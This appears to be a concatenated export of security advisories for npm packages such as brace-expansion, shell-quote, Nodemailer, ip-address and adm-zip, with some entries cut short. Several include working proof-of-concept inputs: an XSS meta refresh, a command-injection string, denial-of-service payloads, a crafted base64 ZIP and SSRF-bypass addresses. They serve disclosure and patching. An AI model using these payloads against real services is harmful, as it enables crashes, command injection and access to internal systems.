Local `sanitize-html@2.17.7`. Output inspection only:

```text
node -e '
const sanitize = require("sanitize-html");
const opts = { allowedTags: ["meta"], allowedAttributes: { meta: ["http-equiv", "content"] } };
for (const html of [
  "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
  "<meta http-equiv=\"refresh\" content=\"0;url=data:text/html,aaa\">",
  "<form><button formaction=\"javascript:alert(1)\">x</button></form>",
]) {
  console.log(html, "=>", sanitize(html, html.includes("meta") ? opts : { allowedTags: ["form","button"], allowedAttributes: { button: ["formaction"] } }));
}
'
```

Expected: refresh `javascript:` / `data:` remain; 53606 `formaction` is removed. Do not attach a browser hang or stored-XSS page.

### Impact

An integrator who allowed `meta` + `content` expecting `allowedSchemes` to apply (the 53606 configuration pattern) still emits a refresh to `javascript:`, `data:`, or an attacker `https:` URL. Stored XSS / open redirect for viewers of that HTML. Default config is not affected.

security_advisory.summary: proxy-addr vulnerable to IP spoofing via IPv4-mapped IPv6 trust subnet
security_advisory.description:
### Impact

`proxy-addr` determines which network hops are trusted proxies so that `X-Forwarded-For` can be believed. When an application configures a trust subnet as an IPv4-mapped IPv6 address with a short prefix, such as `::ffff:10.0.0.0/8` (the correct spelling is `::ffff:10.0.0.0/104`), the subnet compiles with all-zero leading bits and matches every IPv4 address instead of the block it names. The same happens for any IPv6 trust subnet with zero leading bits, such as `::/1`.

Every unauthenticated client is then trusted as a proxy at hop 0, so `proxyaddr(req, trust)`, and therefore `req.ip` and `req.ips` in Express, returns whatever the client sends in `X-Forwarded-For`. This defeats IP-based access control, rate limiting, geolocation, and audit logging. The misconfiguration compiles without any error, and the same block written correctly behaves correctly, so the difference is not visible from the configuration.

### Patches

Upgrade to `proxy-addr` 2.0.8. An IPv4 address now matches an IPv6 trust subnet only when that subnet is a genuine IPv4-mapped subnet whose prefix covers the mapped marker.

### Workarounds

Write IPv4 trust subnets in plain IPv4 notation (for example `10.0.0.0/8`). If IPv4-mapped IPv6 notation is required, use the full form so the prefix covers the mapped marker (for example `::ffff:10.0.0.0/104` for the `10.0.0.0/8` block).

### Impact

A vulnerability in compression `< 1.8.2` allows an attacker to trigger a Denial of Service (DoS) by disconnecting while a compressed response is being sent. When the client aborts the connection before the response finishes, the zlib stream created to compress that response is never destroyed, so each aborted compressed response leaks its native zlib memory. security_advisory.summary: shell-quote: `quote()` command injection via a line terminator in a token after a `{ comment }` token
security_advisory.description:
### Impact

`quote()` emits a `{ comment }` token as `#` followed by its text, which comments out the rest of the shell line, including the opening quote of any later string token. A line terminator in that later string ends the comment, and the rest of the string is parsed as shell input:

```js
quote(['echo', 'ok', { comment: 'x' }, 'a\nid;#']);
// echo ok #x 'a
// id;#'
```

Passed to `sh`, `bash`, `dash`, `ksh`, or `zsh`, this runs `id`.

`parse()` emits a comment token for a `#` in the middle of a word (for example `http://example.com/#frag`), so callers that combine `parse()` output with another untrusted string, such as `quote(parse(untrustedCommand).concat(untrustedArg))`, are affected. The fix for CVE-2026-9277 rejected line terminators in the comment's own text, but not in the tokens after it.

Exploitation requires an attacker-controlled string containing a line terminator that follows a `{ comment }` token in the same `quote()` call.

### Patches

Fixed in v1.11.0: `quote()` throws a `TypeError` when a string after a `{ comment }` token contains a line terminator (`\n`, `\r`, U+2028, or U+2029).

### Workarounds

Drop every token after a `{ comment }` token before calling `quote()`, or reject line terminators in untrusted strings. Separately, do not append other shell text after `quote()` output that contains a comment, since the comment swallows it.

fast-uri vulnerable to inconsistent host case normalization via percent-encoded octets
security_advisory.description:
### Impact

`fast-uri` folds the host to lowercase before it percent-decodes the host, so a percent-encoded uppercase unreserved octet such as `%41` decodes to a literal `A` that is never folded. For a scheme-relative reference (`//host`) there is no scheme, so the host canonicalization that repairs this on a scheme-bearing URL does not run. As a result `parse`, `normalize`, and `equal` disagree on the same host: `parse("//%41.com").host` returns `"A.com"` while `parse("//a.com").host` and `parse("//A.com").host` return `"a.com"`, and `equal("//%41.com", "//a.com")` is `false` even though `equal("//A.com", "//a.com")` is `true`. An application that makes a case-sensitive host decision on `fast-uri` output for a scheme-relative reference, for example a host allowlist or denylist that compares `parse(url).host` or uses `fast-uri.equal`, can be steered past the check with a percent-encoded uppercase octet. Because a hostname is case-insensitive in DNS and HTTP routing, the evading spelling reaches the same host the check meant to gate, so the effect is check evasion rather than reaching a different registrable host.

### Patches

Upgrade to `fast-uri` 4.1.5, 3.1.8, or 2.4.7.

### Workarounds

Compare hosts case-insensitively (lowercase the parsed host before any allowlist or denylist decision), or avoid making case-sensitive host decisions on scheme-relative input until upgrading.

security_advisory.summary: brace-expansion: Quadratic-time expansion of the `{a},b}` rewrite causes CPU denial of service
security_advisory.description:
### Summary

Expanding `{a},b}`-shaped input takes time quadratic in the number of literal `}` characters, blocking the event loop.

Bash preserves a quirk where a brace group followed by a comma set still expands (`{a},b}`). The parser implements this by rewriting the string and restarting the scan. Each pass absorbs exactly one `}` and re-scans from the beginning, so `n` trailing braces cost `n` full passes.

### Reproduction

```js
const build = n => '{a}' + '}'.repeat(n) + ',z}'

for (const n of [8000, 16000, 32000, 64000, 128000]) {
  const t = Date.now()
  expand(build(n))
  console.log(n, Date.now() - t + 'ms')
}
```

| n | input | time | results |
|---|---|---|---|
| 8,000 | 8 KB | 110 ms | 2 |
| 16,000 | 16 KB | 446 ms | 2 |
| 32,000 | 32 KB | 1.7 s | 2 |
| 64,000 | 64 KB | 6.9 s | 2 |
| 128,000 | 128 KB | **27.7 s** | 2 |

`ms/n^2` is flat at ~1.7 and each doubling of `n` costs exactly 4.0x - quadratic. 128 KB of input blocks the event loop for nearly half a minute to produce two results.

### Mechanism

Instrumenting the rewrite branch confirms it runs exactly `n + 1` times, once per literal `}`, each re-scanning the whole string.

There is a second multiplier. The rewrite replaces the group's closing `}` with the internal `escClose` sentinel, which is `'\0CLOSE' + Math.random() + '\0'` - about 25 characters. The working string therefore *grows* by ~25 characters on every pass:

| n | input length | final string length |
|---|---|---|
| 1,000 | 1,006 | 26,006 |
| 8,000 | 8,006 | 208,006 |

So the input is inflated roughly 26x, and that factor multiplies both the quadratic constant and peak memory. This makes it partly a memory-pressure issue as well as a CPU one.

### Why `max` and `maxLength` do not help

The cost is in parsing, before the result set exists. The payload yields 2 results regardless of size, so neither bound is ever reached.

### Impact

An application passing an untrusted pattern to `expand()`, directly or through `minimatch` / `glob`, can have its event loop blocked for tens of seconds by a payload well under minimatch's 65,536-character cap. For a single-threaded Node server that is a full stall, not just a slow request.

Degraded availability rather than a crash - the process recovers once the expansion completes.

### Affected versions

Verified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, all within a few percent of each other (~460-490 ms at n=16,000).

### Patch

The rewrite loop gets an iteration bound. Past the cap the remaining string is treated as non-expanding and returned literally, consistent with the existing `max` / `maxLength` caps, which truncate rather than throw.

Note this bounds the number of passes, not the cost of each: worst-case work remains proportional to `cap x input length`. The cap is set low enough that the residual is bounded in practice, and far above what any realistic `{a},b}` input needs.

### Severity note

Scored 5.3 Medium (`A:L`) for consistency with GHSA-3jxr-9vmj-r5cp, the other algorithmic-complexity advisory on this package (CWE-407), which uses the same vector. The stack-exhaustion advisories on this package score `A:H` because they crash the process outright; this one stalls it.

security_advisory.summary: brace-expansion: DoS via uncontrolled recursion on nested brace groups causing stack exhaustion
security_advisory.description:
### Summary

`expand_()` recurses once per level of brace *nesting*. Deeply nested input exhausts the native stack and crashes the process.

This is distinct from CVE-2026-14257 / GHSA-mh99-v99m-4gvg, which made the *tail* iterative (recursion on `m.post`, driven by how many groups are chained). Nesting depth drives a different recursion that the tail fix never touched, so the documented constant-stack-depth guarantee only ever covered chained input, not nested input.

It is also distinct from GHSA-6j4f-fj2g-mc7p, which fixed recursion in `parseCommaParts()`. Both payloads below still crash with that fix applied.

### Two recursion sites

**Comma members.** Each alternative of a brace set is expanded by a recursive call, so nesting a set inside every alternative recurses once per level:

```js
expand('{a,'.repeat(4000) + 'z' + '}'.repeat(4000))
// RangeError: Maximum call stack size exceeded
```

Crashes at depth 3,907 - about **15.6 KB** of input.

**Single set.** A brace set whose body parses to a single part is expanded by a recursive call before being re-wrapped (`x{{a,b}}y` -> `x{a}y x{b}y`), which recurses once per nesting level:

```js
expand('{'.repeat(3200) + 'a,b' + '}'.repeat(3200))
// RangeError: Maximum call stack size exceeded
```

Crashes at depth 3,125 - about **6.25 KB** of input. This is the cheapest stack-exhaustion payload known against this package: roughly a quarter the input of GHSA-6j4f-fj2g-mc7p (29 KB), and about a tenth of minimatch's `MAX_PATTERN_LENGTH` (65,536).

### Why `max` and `maxLength` do not help

Both crashes happen while recursing into sub-expansions, before the result set grows. The payloads produce almost no output - the single-set case yields 2 results - so neither bound is ever the limiter. `expand(payload, { max: 1, maxLength: 1 })` still overflows.

### Impact

Any application passing an untrusted string to `expand()`, directly or through `minimatch` / `glob` as a user-supplied glob pattern, can be crashed. In Node a `RangeError` the application does not catch terminates the process, so a server globbing user input is exposed to remote unauthenticated denial of service.

Availability only. No code execution, no data exposure.

### Affected versions

Verified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, at near-identical depths on every line (single set: 3,125 on all four; comma members: 3,907-4,102). Not a regression from any recent fix - the gap predates them.

### Patch

A `maxDepth` bound (default `EXPANSION_MAX_DEPTH`) is threaded through `expand_()`. Past the cap a group is treated as non-expanding and returned literally, which is how the parser already handles a group that cannot expand. This matches the existing `max` / `maxLength` caps, which truncate rather than throw, so `expand()` continues never to throw on any input.

The default sits far above any realistic nesting depth and well below the crash threshold.

security_advisory.summary: brace-expansion: DoS via uncontrolled recursion in parseCommaParts causing stack exhaustion
security_advisory.description:
### Summary

`parseCommaParts()` can exhaust the native stack and crash the process. There are two distinct ways to trigger it, both reachable from a single untrusted pattern string.

This is the parsing-side counterpart to CVE-2026-14257 / GHSA-mh99-v99m-4gvg. That fix made `expand_()` iterative and documented a constant-stack-depth guarantee, but `parseCommaParts()` was left recursive, so the guarantee only held for one of the two parsing paths.

### Vector 1 - unbounded recursion on `post`

`parseCommaParts()` recursed on the remainder of the string once per brace group:

```js
const postParts = parseCommaParts(post)   // unbounded
```

A brace group containing many comma-separated groups drives one recursion level per group:

```js
expand('{' + '{a},'.repeat(7000) + 'b}')
// RangeError: Maximum call stack size exceeded
```

About 7,300 repetitions - roughly 29 KB of input - is enough on Node 24; roughly 6,300 (25 KB) on Node 18. The threshold is identical on every affected release line.

### Vector 2 - `push.apply` with an unbounded array

Even with the recursion removed, `parseCommaParts()` spread whole arrays into an argument list:

```js
p.push.apply(p, postParts)
parts.push.apply(parts, p)
```

`Function.prototype.apply` places one argument per element on the stack, so a single large array overflows it. This needs **no recursion depth at all** - the following reaches a recursion depth of exactly 1:

```js
expand('{{x},' + 'a,'.repeat(125000) + 'b}')
// RangeError: Maximum call stack size exceeded
```

Threshold is about 124,300 repetitions (~249 KB). This vector was not part of the original report; it was found while verifying the fix. A patch that only de-recurses but keeps `push.apply` leaves a working denial of service behind.

### Why `max` and `maxLength` do not help

Both crashes happen during **parsing**, before any expansion. The payloads produce one result per group, so output size grows linearly with input and is never the limiter. `expand(payload, { max: 1, maxLength: 1 })` still overflows.

### Impact

Any application that passes an untrusted string to `expand()` - directly, or through `minimatch` / `glob` where it is a user-supplied glob pattern - can be crashed. In Node, a `RangeError` that the application does not catch terminates the process, so a server that globs user input is exposed to remote unauthenticated denial of service.

`minimatch`'s own `MAX_PATTERN_LENGTH` cap (65,536) does not help against vector 1: the overflow threshold sits well below it. Confirmed on minimatch 10.2.6 - a 64,003-byte pattern passes the length check and overflows both `minimatch.braceExpand()` and `new minimatch.Minimatch()`.

This is an availability-only issue. No code execution and no data exposure.

### Not a regression

5.0.8 and 5.0.9 overflow at the same repetition count, so the gap predates the recent advisories; those fixes simply did not reach it. Verified affected on 1.1.18, 2.1.4, 3.0.6, 5.0.8 and 5.0.9, all at an identical threshold.

### Patch

`parseCommaParts()` is rewritten as a loop that carries the partial part across chunks, and every array append uses an element-by-element loop rather than `push.apply`. The redundant `if (!str) return ['']` guard is dropped - the loop returns `['']` for the empty string on its own.

Equivalence of the old and new implementations was checked by differential testing: exhaustive over every string of `{`, `}`, `,`, `a` up to length 7 plus 300,000 random inputs - 322,000 cases, zero mismatches.

### Severity note

Scored 7.5 High under CVSS 3.1 for consistency with the other availability advisories on this package (GHSA-mh99-v99m-4gvg, GHSA-rgw5-rvv9-x895), which use the same vector. The reporter self-assessed 6.9 Medium under CVSS 4.0 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N`).

### Credit

Reported by baeseungwon1010, with a working proof of concept and a proposed patch. Vector 2 was identified during maintainer verification.

security_advisory.summary: joi: Quadratic regular-expression backtracking in `Joi.string().isoDate()`
security_advisory.description:
### Impact
Any application that validates a user-supplied string with `Joi.string().isoDate()` can be stalled by a single request. One of the regular expressions the rule runs over the input was unanchored, so a valid ISO date followed by a long run of fractional-second digits made the regex engine restart its search from every position in the string, costing time proportional to the square of the input length. 64 KB of digits costs about 1.4 s and 256 KB about 22 s.

### Patches
Upgrade to version 17.13.7 or 18.2.6 depending on your current major version.

### Workarounds
None except capping the length of the string before it reaches joi.

security_advisory.summary: Electron: Sandboxed preload code cache can be poisoned by a compromised renderer
security_advisory.description:
### Impact

The cache Electron keeps for sandboxed preload scripts did not verify that a cached entry matched the preload it was served for. A compromised renderer could use this to run its own code in the preload context on a later load.

Apps are only affected if they load untrusted content. Apps that do not load untrusted content are not affected.

### Workarounds

There are no app side workarounds, you must update to a patched version of Electron.

### Fixed Versions

* `44.0.0-beta.6`
* `43.5.0 `
* `42.10.0`

### For more information

If you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org)

security_advisory.summary: Nodemailer: Process-global DNS cache reuses TLS `servername` across transports, enabling cross-tenant SMTP credential disclosure
ip-address: no classifier recognizes the NAT64 local-use range 64:ff9b:1::/48, allowing SSRF and trust-boundary bypass
security_advisory.description:
### Summary

No classifier on `Address6` recognizes the NAT64 local-use range `64:ff9b:1::/48` (RFC 8215). `isPrivate()`, `isLoopback()`, `isLinkLocal()` and their siblings all return `false` for every address in it, so an internal IPv4 destination written through a local-use NAT64 prefix (`64:ff9b:1:7f00:0:100::` for `127.0.0.1`, `64:ff9b:1:a9fe:a9:fe00::` for `169.254.169.254`) reads as an ordinary global address. `getType()` names the range `'NAT64 (local-use)'`, so the library knows what the address is and classifies it as nothing.

An application that builds a network trust-boundary decision on these checks (for example a filter intended to block Server-Side Request Forgery, or SSRF) will classify an internal target as external and allow the request. SSRF is an attack in which a user-supplied address coaxes the server into making a request to an internal destination the user could not otherwise reach, such as a loopback service or a cloud metadata endpoint.

### Details

The fix for GHSA-22jq-vg5j-6vgg (10.2.1) classifies IPv4-mapped (`::ffff:0:0/96`) and NAT64 well-known (`64:ff9b::/96`) addresses by their embedded IPv4 address: `embeddedIPv4()` in `src/ipv6.ts` decodes the trailing 32 bits and every special-use classifier delegates to the resulting `Address4`. Those are the only two ranges `embeddedIPv4()` handles.

The local-use range differs in kind from the well-known prefix, which is why extending the decoder does not fix it. RFC 8215 reserves `64:ff9b:1::/48` so an operator can carve their own NAT64 prefix out of it, of any length RFC 6052 allows (`/48`, `/56`, `/64`, or `/96`). Where the IPv4 address sits depends on that choice: `127.0.0.1` is `64:ff9b:1:7f00:0:100::` under a `/48` prefix and `64:ff9b:1::7f00:1` under a `/96` prefix, and each of those decodes to a different address under the other prefix length. There is no single embedded IPv4 address for the library to classify by.

What is well-defined is the range as a whole. The IANA IPv6 Special-Purpose Address Registry lists `64:ff9b:1::/48` as not globally reachable, and Python's `ipaddress` module reports `is_private` as `True` and `is_global` as `False` for every address in it. `isPrivate()` covered ULA (`fc00::/7`) plus the decoded mapped and well-known cases, and nothing in the local-use range.

### Affected versions

`>= 10.2.0, <= 10.5.0`. The `is*` classification API was extended to `Address6` in 10.2.0; releases before it do not expose the method and are not affected through this vector.

### Impact

Every address in `64:ff9b:1::/48` parses successfully, `isValid()` is `true`, and no classifier catches it. Which internal target is reached depends on the NAT64 prefix deployed on the server's network; the well-known prefix column is the patched control from GHSA-22jq-vg5j-6vgg.

| Internal target | Well-known form | Classified | Local-use form (`/48` prefix) | Classified |
|---|---|---|---|---|
| `127.0.0.1` | `64:ff9b::7f00:1` | loopback | `64:ff9b:1:7f00:0:100::` | nothing |
| `10.0.0.1` | `64:ff9b::a00:1` | private | `64:ff9b:1:a00:0:100::` | nothing |
| `169.254.169.254` | `64:ff9b::a9fe:a9fe` | link-local | `64:ff9b:1:a9fe:a9:fe00::` | nothing |
| `192.168.1.1` | `64:ff9b::c0a8:101` | private | `64:ff9b:1:c0a8:1:100::` | nothing |

### Reachability

Reaching an internal host through one of these addresses requires that the server's network run a NAT64 translator on a prefix inside `64:ff9b:1::/48` and that the attacker guess or know the prefix length. That is the same precondition the well-known prefix carries (a translator on `64:ff9b::/96`), with the additional constraint that the prefix is operator-chosen rather than fixed. The severity reflects that precondition.

### Proof of concept

`npm i ip-address@10.5.0`, then:

```js
const { Address6 } = require('ip-address');

// A guard of the shape the library documents.
function isBlocked(host) {
  const a = new Address6(host);
  return a.isLoopback() || a.isLinkLocal() || a.isPrivate() || a.isMulticast() || a.isUnspecified();
}

for (const h of ['64:ff9b::7f00:1', '64:ff9b:1:7f00:0:100::', '64:ff9b:1::7f00:1']) {
  console.log(isBlocked(h) ? 'BLOCK' : 'ALLOW', h, '-> getType()', new Address6(h).getType());
}
```

On affected versions:

```
BLOCK 64:ff9b::7f00:1 -> getType() NAT64 (well-known)
ALLOW 64:ff9b:1:7f00:0:100:: -> getType() NAT64 (local-use)
ALLOW 64:ff9b:1::7f00:1 -> getType() NAT64 (local-use)
```

### Remediation

Upgrade to the patched release. In the fix, `isPrivate()` returns `true` for every address in `64:ff9b:1::/48`, alongside ULA and the decoded mapped and well-known cases. The range is reported private as a whole rather than by a decoded IPv4 address, for the reason given above; `toAddress4Nat64(prefix)` remains the way to decode an address under a known deployment prefix. `isLoopback()` and `isLinkLocal()` are unchanged for this range, since without the prefix length the library cannot know which IPv4 address is embedded.

If you cannot upgrade immediately, test the range directly:

```js
const NAT64_LOCAL_USE = new Address6('64:ff9b:1::/48');
const localUse = new Address6(host).isHostInSubnet(NAT64_LOCAL_USE);
```

### A note on SSRF defense

These methods are address classifiers, not a complete SSRF defense. Regardless of this fix, a robust SSRF guard must resolve the hostname and validate the *resolved* IP against the socket it connects to, and account for DNS rebinding and redirects. Treat these checks as one layer, not the only one.

security_advisory.summary: undici vulnerable to Denial of Service via unhandled error in WebSocket permessage-deflate decompression
security_advisory.description:
## Impact

undici's WebSocket client (including Node.js's bundled `globalThis.WebSocket`) crashes the entire Node.js process when a remote WebSocket peer sends a permessage-deflate compressed message that crosses the decompressed-payload size limit and then contains a malformed DEFLATE block. In `lib/web/websocket/permessage-deflate.js`, the size-limit cleanup calls `removeAllListeners()` on the internal zlib `InflateRaw`, removing its `error` listener, but leaves the stream running. The inflater then emits a `Z_DATA_ERROR` with no listener attached, which Node.js treats as a fatal unhandled `error` event and terminates the process. Application `error`/`close` handlers on the public WebSocket cannot observe or prevent this, because the failing object is the internal `InflateRaw`.

A malicious or compromised WebSocket server can crash a client with a single connection, unauthenticated and without any application mistake. The attack is asymmetric (about 130 KB on the wire expands past the limit) and can be repeated on reconnect (crash loop).

Affected applications are those using the undici WebSocket client (`new WebSocket(...)`) or Node.js's bundled `globalThis.WebSocket` that can be induced to connect to an attacker-controlled or compromised WebSocket endpoint.

## Patches

Upgrade to undici v6.28.1, v7.29.1 or v8.10.2.

## Workarounds

No workaround is available.

security_advisory.summary: image-size: ICNS parser allows denial of service through an infinite loop
security_advisory.description: image-size through 2.0.2 contains a denial of service vulnerability that allows remote attackers to permanently block the Node.js event loop by supplying a specially crafted ICNS image buffer. Attackers can craft an ICNS buffer containing valid magic bytes and a zero-valued entry length field to trigger an infinite loop in the ICNS parser, as the offset is never incremented when the entry length field is 0, causing the while loop condition to remain true indefinitely.

security_advisory.summary: image-size: JXL and HEIF parsers allow denial of service through infinite loops
security_advisory.description: image-size through 2.0.2 contains a denial of service vulnerability that allows remote attackers to permanently block the Node.js event loop by supplying a specially crafted image buffer with a zero-valued size field in a recognized box-type. Attackers can trigger an infinite loop in the JXL or HEIF image parsers by providing a crafted image containing a box with a size of zero, causing the offset to never advance and permanently hanging the application.

security_advisory.summary: adm-zip: Uncontrolled memory allocation via the declared uncompressed size (DoS)
security_advisory.description:
### Summary
adm-zip allocates an entry's output buffer from the declared uncompressed size (central-directory `size` field) before validating it against the actual data. A tiny crafted ZIP that declares a huge uncompressed size forces a multi-gigabyte allocation from a few bytes.

### Impact
On adm-zip 0.5.17 (latest), Node 24, a 105-byte ZIP with one stored entry declaring size = 1,774,399,200 makes `new AdmZip(buf).getEntries()[0].getData()` commit ~1.8 GB of resident memory in ~4.4 s before throwing `Error: ADM-ZIP: CRC32 checksum failed`, roughly 16 million times the input size. Because the buffer is committed before any validation, on a memory-constrained host (containers, serverless, small VMs) the allocation OOM-kills the process before the CRC check (uncatchable), and concurrent requests can exhaust memory even on larger hosts. Any service that reads entries from untrusted ZIPs is exposed to a remote denial of service.

### Steps to reproduce
Attachments are not supported in the advisory form, so the 105-byte PoC (sha256 `980d34356fbb248fe527b9d0ac3eabc5c99393a374014be6199523de16709386`) is inlined as base64 in this self-contained reproducer:

```js
const AdmZip = require('adm-zip');
// 105-byte crafted ZIP, base64-inlined
// sha256 980d34356fbb248fe527b9d0ac3eabc5c99393a374014be6199523de16709386
const b64 = "UEsDBBQAAAAAAAAAAAAAAAAABQAAAAUAAAABAAAAYWhlbGxvUEsBAhQAFAAAAAAAAAAAAAAAAAAFAAAA4C7DaQEAAAAAAAAAAAAAAAAAAAAAAGFQSwUGAAAAAAEAAQAvAAAAJAAAAAAA";
const buf = Buffer.from(b64, "base64");          // 105 bytes
const zip = new AdmZip(buf);
zip.getEntries()[0].getData();   // commits ~1.8 GB, then throws "ADM-ZIP: CRC32 checksum failed"
```

The single entry declares uncompressed size = 1,774,399,200 with a compressed size of 5. `getData()` allocates the full declared size before the CRC check runs, so the memory is committed regardless of the (tiny) actual payload.

### Root cause
`zipEntry.js` does `Buffer.alloc(<declared uncompressed size>)` before checking the declared size against the compressed size / available bytes.

### Suggested fix
Validate the declared uncompressed size against the compressed size and a configurable maximum before allocating (yauzl, for example, requires the caller to bound this); reject or stream when the declared size is implausible relative to the input. Happy to send a patch.

cwes.name: Memory Allocation with Excessive Size Value

security_advisory.summary: Nodemailer: IDN/Punycode domain allow-list bypass leads to email delivery to an attacker-controlled domain
Nodemailer: Quadratic (O(n²)) time complexity in addressparser allows remote denial of service via a crafted address list
security_advisory.description:
### Summary

Nodemailer's address parser (`lib/addressparser/index.js`) parses a list of comma‑separated addresses in **quadratic time — O(n²)** in the number of addresses. A single crafted address string (e.g. a `To`, `Cc`, `Bcc`, `From`, or `Reply‑To` value, or any value passed to the exported `addressparser`) therefore consumes CPU proportional to the **square** of its length and blocks Node's single‑threaded event loop for the entire duration, denying service to every other request in the process.

This requires **no special application configuration and no cooperating receiver** — it is entirely inside the parser and triggers on the library's default code path. A ~1.5 MB address value freezes the process for ~25–30 seconds of 100% CPU; the cost grows with the square of the input, so a few‑MB value stalls the server for minutes. It is a distinct issue from the recursion DoS fixed as CVE‑2025‑14874 (that path is guarded by a nesting‑depth cap; this one is a flat, comma‑separated list with no such limit).

### Details

`addressparser` tokenizes the input, splits it into per‑address token groups, and then accumulates the parsed results in a loop (`lib/addressparser/index.js`, ~lines 500–505):

```js
addresses.forEach(addr => {
    const handled = _handleAddress(addr, depth);
    if (handled.length) {
        parsedAddresses = parsedAddresses.concat(handled);   // <-- line ~503
    }
});
```

`Array.prototype.concat` builds and returns a **new** array containing a copy of every element accumulated so far. Reassigning `parsedAddresses = parsedAddresses.concat(handled)` on each of the *n* iterations copies 1 + 2 + 3 + … + n elements in total, i.e. **O(n²)** work (and O(n²) transient allocations) for an input containing *n* addresses. Tokenization and `_handleAddress` themselves are linear; the quadratic blowup is entirely this accumulator.

**Root‑cause proof.** Replacing only that line with an in‑place append and re‑running the exact same input:

```
parsedAddresses = parsedAddresses.concat(handled);      ->  100000 addresses:  ~6068 ms
parsedAddresses.push.apply(parsedAddresses, handled);   ->  100000 addresses:  ~51 ms   (≈119x faster, now linear)
```

**Measured scaling** (nodemailer 9.0.6, `'a@b.com,'.repeat(n)`):

| addresses n | input size | parse time | ratio for 2× input |
|---|---|---|---|
| 25,000  | 0.19 MB | ~0.35 s | – |
| 50,000  | 0.38 MB | ~1.4 s  | ×4.0 |
| 100,000 | 0.76 MB | ~6–8 s  | ×3.9 |
| 200,000 | 1.53 MB | ~25–30 s| ×4.1 |

Doubling the input quadruples the time — the signature of O(n²).

**Reachability.** The parser is invoked on any structured‑address header value on the normal send path (`MimeNode.setHeader('To'/'Cc'/'Bcc'/'From'/'Reply-To', value)` → `_parseAddresses` → `addressparser`, and `getEnvelope()`), so a single `transport.sendMail({ to: <crafted string> })` triggers it. It is also reached directly through the **exported** `require('nodemailer/lib/addressparser')`, which many applications call to validate or display user‑supplied recipient lists. Confirmed via the public API: `setHeader('To', 'a@b.com,'.repeat(80000))` + `getEnvelope()` blocks for ~3.9 s.

**Suggested fix:** accumulate in place instead of rebuilding the array each iteration, e.g. `parsedAddresses.push.apply(parsedAddresses, handled);` (or `for (const h of handled) parsedAddresses.push(h);`). Optionally cap the number of addresses / input length before parsing.

### PoC

Environment: Node.js ≥ 18 and the published `nodemailer@9.0.6`. No transport, network, or configuration required — the cost is in parsing.

`poc-dos.js`:
```js
'use strict';
const addressparser = require('nodemailer/lib/addressparser');

console.log('addresses | input size | parse time');
for (const n of [25000, 50000, 100000, 200000]) {
  const payload = 'a@b.com,'.repeat(n);        // n valid, comma-separated recipients
  const t0 = process.hrtime.bigint();
  addressparser(payload);                       // blocks synchronously
  const ms = Number(process.hrtime.bigint() - t0) / 1e6;
  console.log(String(n).padStart(9) + ' | ' + (payload.length / 1048576).toFixed(2) + ' MB   | ' + ms.toFixed(0).padStart(7) + ' ms');
}
```

Run:
```
npm init -y && npm install nodemailer@9.0.6
node poc-dos.js
```

Actual output (nodemailer 9.0.6):
```
addresses | input size | parse time
    25000 | 0.19 MB   |     381 ms
    50000 | 0.38 MB   |    1435 ms
   100000 | 0.76 MB   |    7949 ms
   200000 | 1.53 MB   |   25154 ms
```

Equivalent trigger through the normal send API (freezes the event loop):
```js
const nodemailer = require('nodemailer');
nodemailer.createTransport({ jsonTransport: true })
  .sendMail({ from: 'a@b.com', to: 'a@b.com,'.repeat(150000), subject: 'x', text: 'y' });
// ~15+ seconds of 100% CPU inside addressparser before anything is sent
```

### Impact

* **Who is impacted:** any service that runs Nodemailer (or the standalone `nodemailer/lib/addressparser`) on an address value that can be influenced by an untrusted party — a recipient field in a "send email / invite / share" feature, a `Reply‑To`/`From` derived from user input, a contact‑import or mailing‑list parser, or any endpoint that validates addresses with `addressparser`. No authentication, special option, or particular receiver is needed.

## Patched in 9.1.0

Three separate quadratic paths were fixed, not one:

* `addressparser` rebuilt its accumulator with `concat()` on every address ([9116da9](https://github.com/nodemailer/nodemailer/commit/9116da9)).
* The display-name merge loop directly below spliced each fragment out of the array, the same shape reached through `'a, b <c@d.com>,'.repeat(n)` (same commit).
* `MimeNode#_convertAddresses` checked recipient uniqueness with a linear scan per address ([7cc38af](https://github.com/nodemailer/nodemailer/commit/7cc38af), refined in [34da642](https://github.com/nodemailer/nodemailer/commit/34da642)). This was the most severe of the three and the reported proof of concept did not reach it: `'a@b.com,'.repeat(n)` is one address repeated, which dedupes to a single envelope entry. A list of *distinct* recipients cost O(n^2) here, taking ~35s for 100k even after `addressparser` was fixed.

Fixed alongside: `[].concat.apply` in `_parseAddresses` threw `RangeError: Maximum call stack size exceeded` past roughly 124k recipients, with no crafted input needed ([83b8c48](https://github.com/nodemailer/nodemailer/commit/83b8c48)).

Parsing 200k addresses now takes ~80ms instead of ~25s, and every path scales linearly. A new `maxRecipients` option (default 100000) throws rather than truncating, as a backstop.
